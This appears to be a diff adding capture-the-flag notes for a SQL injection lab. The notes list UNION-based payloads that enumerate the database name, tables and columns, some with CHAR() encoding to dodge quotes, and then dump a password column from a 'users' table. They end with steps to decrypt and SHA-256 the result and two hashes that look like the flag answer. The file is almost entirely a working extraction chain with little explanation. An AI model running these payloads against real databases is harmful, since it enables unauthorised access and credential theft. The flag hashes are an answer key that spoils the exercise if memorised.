@@ -1,0 +1,16 @@
+1 UNION SELECT table_name, NULL FROM information_schema.tables --
+
+1 UNION SELECT database(), NULL --
+
+1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110) --
+1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'Member_Sql_Injection'
+
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = CHAR(117, 115, 101, 114, 115) --
+1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'
+
+1 UNION SELECT countersign, NULL FROM users --
+
+Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
